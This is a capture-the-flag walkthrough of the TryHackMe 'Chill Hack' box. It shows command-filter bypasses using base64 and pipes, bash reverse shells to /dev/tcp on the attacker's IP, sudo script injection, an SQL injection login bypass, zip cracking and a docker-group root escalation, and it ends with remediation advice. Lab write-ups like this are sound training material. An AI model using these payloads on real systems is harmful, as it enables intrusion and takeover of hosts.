# Chill Hack - C0smicPrince

## 1. Box Info

<table border="1" id="bkmrk-name-platform-and-di" style="border-collapse: collapse; width: 100%;"><colgroup><col style="width: 50%;"></col><col style="width: 50%;"></col></colgroup><tbody><tr><td>**Name**

</td><td>Chill Hack</td></tr><tr><td>**Platform And Difficulty**

</td><td>TryHackMe, Easy</td></tr><tr><td>**Area Of Interest / Vulnerabilities Covered**

</td><td>Command Injection, Privilege Escalation</td></tr></tbody></table>

## 2. Reconnaissance &amp; Enumeration

### 2.1. Scoping the Network

We start our journey with a thorough port scan to identify the attack surface. In this phase, we look for "doors" (ports) that are open on the target.

**Nmap Scan:**

```
nmap $IP -sVC -p- -vv --min-rate=5000 -oN nmap_initial
```

**Command Breakdown:**

- `-sV`: Service version detection (tells us what software is running).
- `-sC`: Runs default nmap scripts (checks for common vulnerabilities).
- `-p-`: Scans all 65,535 ports.
- `--min-rate=5000`: Speeds up the scan (be careful on real engagements as this is noisy).
- `-oN`: Saves the output to a normal text file for later reference.

**Output**

```
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5                                                                                                                                                                                           
| ftp-syst:                                                                                                                                                                                                                                
|   STAT:                                                                                                                                                                                                                                  
| FTP server status:                                                                                                                                                                                                                       
|      Connected to ::ffff:192.168.216.154                                                                                                                                                                                                 
|      Logged in as ftp                                                                                                                                                                                                                    
|      TYPE: ASCII                                                                                                                                                                                                                         
|      No session bandwidth limit                                                                                                                                                                                                          
|      Session timeout in seconds is 300                                                                                                                                                                                                   
|      Control connection is plain text                                                                                                                                                                                                    
|      Data connections will be plain text                                                                                                                                                                                                 
|      At session startup, client count was 2                                                                                                                                                                                              
|      vsFTPd 3.0.5 - secure, fast, stable                                                                                                                                                                                                 
|_End of status                                                                                                                                                                                                                            
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                     
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt                                                                                                                                                                         
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                                             
|   3072 d1:54:03:e2:be:c3:a4:03:43:aa:14:d8:3c:45:69:a6 (RSA)                                                                                                                                                                             
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCv3Ez2c6DBD05ZSUe8KLL4LsJYOAjQz1g00rQBJSa84aQe5IFek8xh/hHYMlDERqYtAsuwieHqRrJ/U5vTT+dBmKsVImwYMQ0+JnkuibGxn8OTYyL/iJ3okD7gyKUp1wQFJs9D/vNbTwAW/r0fB7KaOqb94ERyvg4qly+lHEt+nK7c423hGP0ICjKkkolgbu1/b
9U6mVrYUk8Jb30rk9d/9Pg4VDtcvu55RQxrl5Dd7uQbEIibc9S9ER8A2cOcGl+iusxGBgWQ1WYtiCDTWGAUJfoWBqEiPPoqyc+TzBtOk7NLZa9eu9AVB+VVziRhrjDM5xnFnnEzJ7lTdM3Zi/h9EnXaeWQd75jqqKrrH4p6qnjchc0GIbkrshcEQuH/553HGN0rkAoUgLPJctiZpE4S0/WyOBi9I9Qb2YKAHQ46uK1j
hOam/95ZlgfILHvkDPdD6E2FEqUe9WxyLG81eQ5j3EJmR+RLDEgu6vQbRxtqB02F+kp6TwcC3/nEclPayoE=                                                                                                                                                       
|   256 a7:86:75:a4:9c:e7:09:1c:e1:41:99:7c:3e:9a:e9:7c (ECDSA)                                                                                                                                                                            
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD4QC2h1jPeIHV+HSVEsX6PJvtikEhajwS8xzSN+t8Rz8nZD+nR3tL0f3WYVEkfFsneS1PquGRnuzVnxhTh0WgQ=                                                                         
|   256 c0:9d:17:0c:bb:53:ab:d9:ad:72:22:d6:7e:89:75:cf (ED25519)                                                                                                                                                                          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbQ/rM188tZGezyK/3qbw985AznaiO1Aw2vfHmcttYx                                                                                                                                                         
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                                         
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17                                                                                                                                                                      
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                                                               
| http-methods:                                                                                                                                                                                                                            
|_  Supported Methods: GET POST OPTIONS HEAD                                                                                                                                                                                               
|_http-title: Game Info                                                                                                                                                                                                                    
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Now we can login in FTP as anonymous which doesn't require password, after logging in as anonymous we can find note.txt on ftp, we can download it using:

```
get note.txt
```

Viewing it reveals the following content:

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### 2.2. Web Discovery

Upon identifying a web server on port 80, I performed technology profiling and directory discovery. Web servers are often the most common entry point.

**WhatWeb Analysis:** WhatWeb identifies technologies used by a website (e.g., servers, embedded scripts, and CMS versions).

```
http://10.49.153.127/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[demo@gmail.com], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.49.153.127], JQuery[1.11.1], Script, Title[Game Info], X-UA-Compatible[IE=edge]
```

**Directory &amp; VHost Fuzzing:** I utilized `ffuf` (Fuzz Faster U Fool) to discover hidden folders or subdomains that aren't linked on the main page.

```
ffuf -c -u 'http://10.49.153.127/FUZZ' -w ~/wordlist/common.txt -t 30 -ic
```

**Key Findings:**

- `/secret`: This is a endpoint where we can execute commands but some commands are filtered

## 3. Exploitation (Getting a Foothold)

### 3.1. Breaking In

When we type commands such as ls, we get to see a gif saying 'are you a hacker?' but if we use command like whoami then it gives us response, which exactly matches with note.txt, but what i am interest in is to see if special characters work, such as pipe, and etc. For that i executed command whoami which as returned www-data, then i ran command echo 'I work' which also worked, then i combined it and it became:

```
whoami; echo 'i work'
```

which printed `www-data i work` on the screen so we now know that special char work, next i tried to run ls which printed are you a hacker, so to get around this, i used pipe, which transfers output of one command to another, final command:

```
ls| base64 | base64 -d
```

which worked because most likely backend is made using command matches these words do this, so in simple words ls will fail however since ls| is not in match list, it won't trigger the message, and to linux pipe is valid, hence leading to command execution. we can enumerate the backend using this:

```
ls; cd ../../../; ls;
```

Another way to bypass the filter is as we know we can run echo, but we cannot run bash, however we can run |bash, so we can in your system base64 encode our command and then do pipe (|) and then bash, a example would be:

```
echo 'bHMgLWxhCg==' | base64 -d |bash
```

Let's get a shell now, i used the following payload and base64 encoded it:

```
/bin/bash -i >& /dev/tcp/[IP]/4001 0>&1
```

And in command we can execute the following:

```
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjE2LjE1NC80MDAxIDA+JjEK'  | base64 -d |bash
```

In echo put your base64 encoded string and you should get a shell:

```
┌──(Ash㉿kali)-[~/Boxes/chillhack]
└─$ penelope -p 4001                                                        
[+] Listening for reverse shells on 0.0.0.0:4001 -> 127.0.0.1 • 10.0.2.15 • 172.18.0.1 • 172.17.0.1 • 192.168.216.154
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => ip-10-49-153-127 10.49.153.127 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/Ash/.penelope/sessions/ip-10-49-153-127~10.49.153.127-Linux-x86_64/2026_06_06-01_47_33-318.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ip-10-49-153-127:/var/www/html/secret$ whoami
www-data
www-data@ip-10-49-153-127:/var/www/html/secret$ 
```

## 4.2. Internal Enumeration

Now what we have access to the system, running sudo -l command reveals we can run the following as user apar:

```
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Let's review the script and see what it does, the script is:

```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

This is a classic command injection vulnerability, our input will be taken as command, to get shell as apaar, do the following:

1\. sudo -u apaar /home/apaar/.helpline.sh

Message will be printed asking for our name, you can enter anything you like, but when it asks us to enter our message, type this:

2\. /bin/bash

now this should result in a empty shell, meaning you won't see the user, now run this command:

```
echo '/bin/bash -i >& /dev/tcp/192.168.216.154/4002 0>&1' | bash
```

Make sure to replace your own ip with mine, the whole process:

```
(remote) www-data@ip-10-48-163-99:/tmp$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: C0smicPrince
Hello user! I am C0smicPrince,  Please enter your message: /bin/bash
echo '/bin/bash -i >& /dev/tcp/192.168.216.154/4002 0>&1' | bash

```

Now we should in our listener get our shell:

```
─(Ash㉿kali)-[~]
└─$ pwncat-vl -p 4002
[17:40:19] Welcome to pwncat 🐈!                                                                                                                                                                   __main__.py:164
[17:40:25] received connection from 10.48.163.99:56244                                                                                                                                                  bind.py:85
[17:40:28] 10.48.163.99:56244: registered new host w/ db                                                                                                                                            manager.py:989
(local) pwncat$                                                                                                                                                                                                   
(remote) apaar@ip-10-48-163-99:/tmp$ whoami
apaar
(remote) apaar@ip-10-48-163-99:/tmp$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
(remote) apaar@ip-10-48-163-99:/tmp$ 

```

## 5. Privilege Escalation (Scaling to Root)

### 5.1. The Escalation Path

Now when we run ss -tunlp we see many ports running on the system with some interesting ports, i will use ligolo-ng to port forward all these:

```
(remote) apaar@ip-10-48-163-99:/tmp$ ss -tunlp   
Netid                State                 Recv-Q                Send-Q                                   Local Address:Port                                Peer Address:Port               Process               
udp                  UNCONN                0                     0                                        127.0.0.53%lo:53                                       0.0.0.0:*                                        
udp                  UNCONN                0                     0                                    10.48.163.99%eth0:68                                       0.0.0.0:*                                        
tcp                  LISTEN                0                     511                                          127.0.0.1:9001                                     0.0.0.0:*                                        
tcp                  LISTEN                0                     128                                            0.0.0.0:22                                       0.0.0.0:*                                        
tcp                  LISTEN                0                     151                                          127.0.0.1:3306                                     0.0.0.0:*                                        
tcp                  LISTEN                0                     4096                                     127.0.0.53%lo:53                                       0.0.0.0:*                                        
tcp                  LISTEN                0                     70                                           127.0.0.1:33060                                    0.0.0.0:*                                        
tcp                  LISTEN                0                     511                                                  *:80                                             *:*                                        
tcp                  LISTEN                0                     32                                                   *:21                                             *:*                                        
tcp                  LISTEN                0                     128                                               [::]:22                                          [::]:* 
```

In in our kali run these commands:

```
sudo ip tuntap add dev ligolo mode tun user $(whoami)
```

Then we enable the tun mode:

```
sudo ip link set dev ligolo up
```

and add the ip range so we can access 127.0.0.0 ports:

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

and start the proxy via:

```
sudo ./proxy -selfcert
```

Transfer your agent, you can either use apache2 as a web server or if you use a smart listener like penelope or pwncat you can use there upload function, after uploading run the agent with:

```
 ./linux_agent -connect 192.168.216.154:11601 -ignore-cert
```

In your proxy server you should see info that agent has joined now run the command session select the session and start.

Now on [http://240.0.0.1:9001/](http://240.0.0.1:9001/) we see a customer portal, we can use the following payload as our username to bypass the login:

```
' OR 1=1-- -
```

Now save the img and we can use:

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

when it asks for passphrase simply put enter, now we got backup.zip we can extract it using unzip backup.zip but it asks for password, we can use fcrackzip to crack it:

```
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' backup.zip
```

result:

```
PASSWORD FOUND!!!!: pw == redacted
```

after extracting we get source\_code.php with a base64 encoded password, when we decode it it gives us anurodh passsword:

```
$email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "base64_redacted==")
                { 

```

```
echo 'Redacted==' | base64 -d
```

and we get our password. we can ssh into the machine. running id command, we are part of docker group:

```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

and now running this command will give us root:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

and we can fetch our flag from root home dir:

```
# cat proof.txt


                                        {ROOT-FLAG: Redacted}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a



# 

```

## 6. Conclusion &amp; Mitigations

### Remediation for Command Injection (Web Endpoint: `/secret`)

The initial foothold was gained via a command injection vulnerability where input filtering was bypassed using piping (`|`) and encoding (`base64`).

- **Implement Strict Allow-Listing:** Avoid blacklisting individual command strings (like `ls` or `cat`), as attackers will consistently find bypass techniques (e.g., concatenation, encoding, or piping). Instead, implement a strict allow-list that only permits expected input formats (e.g., alphanumeric strings or explicit choices).
- **Avoid Direct Shell Execution:** Do not pass raw user input into shell-executing functions (such as PHP's `system()`, `exec()`, or `shell_exec()`). If system commands must be executed, use built-in language APIs or libraries that pass arguments safely as an array rather than invoking a system shell.
- **Apply Principal of Least Privilege:** Ensure the web server user (`www-data`) has the bare minimum filesystem permissions necessary to run the application, completely preventing access to external system binaries where possible.

### Remediation for Sudo Misconfiguration &amp; Script Flaws (`.helpline.sh`)

The custom script `/home/apaar/.helpline.sh` allowed a secondary command injection because a user-supplied variable (`$msg`) was evaluated directly as an executable command by the shell, and the script was allowed to run with elevated privileges via `sudoers`.

- **Secure Code Evaluation:** Never execute user input directly as a command in shell scripts. If the input is intended to be a text message, handle it purely as data (e.g., writing it to a file or standard output using quoting) without leaving it bare for the shell interpreter to execute.
- **Restrict Sudoers Execution:** Avoid granting `NOPASSWD` sudo execution rights to custom scripts unless they have undergone a rigorous security code review. If custom scripts must be run as another user, ensure the configuration file containing the script cannot be modified or manipulated by lower-privileged accounts.

### Remediation for Weak Credential Storage &amp; Source Disclosure

The privilege escalation path relied on extracting a backup archive (`backup.zip`) containing cleartext source code and a reversible cryptographic string (`base64_encode($password)`).

- **Strong Password Hashing:** Never store passwords in cleartext or use reversible encoding schemes like Base64. Use secure, industry-standard cryptographic hashing functions such as **bcrypt**, **Argon2**, or **PBKDF2** with individual salts.
- **Robust Archive Encryption:** Ensure offline backup files are protected with high-entropy, strong passwords to prevent offline brute-forcing via tools like `fcrackzip`.
- **Secure Web Directories:** Web-accessible panels or hidden portals should not reference or expose backup directories (`.zip`, `.bak`, `.old`) within the web root.

### Remediation for Local Privilege Escalation (Docker Group Membership)

User `anurodh` had direct access to the `docker` socket/group, which allowed them to mount the host root filesystem (`/:/mnt`) inside a container, breaking out to full root access.

<div _ngcontent-ng-c2747712683="" class="container" id="bkmrk-treat-docker-access-"><div _ngcontent-ng-c1556873897="" aria-busy="false" aria-live="polite" class="markdown markdown-main-panel stronger enable-updated-hr-color" dir="ltr" id="bkmrk-treat-docker-access--1" inline-copy-host="" style="--animation-duration: 400ms; --fade-animation-function: ease-out;">- **Treat Docker Access as Root Access:** Membership in the `docker` group is effectively equivalent to having full root privileges because it allows arbitrary container execution with host namespace access.
- **Implement Rootless Docker:** Where containerization is required for standard users, configure **Rootless Mode** to run the Docker daemon and containers within a user namespace, preventing container escape from granting host-level root privileges.
- **Restrict Access via Polkit:** If multiple users share the host, restrict access to the Docker daemon socket using authorization plugins or Polkit rules to ensure container creation requires explicit re-authentication.

</div></div>
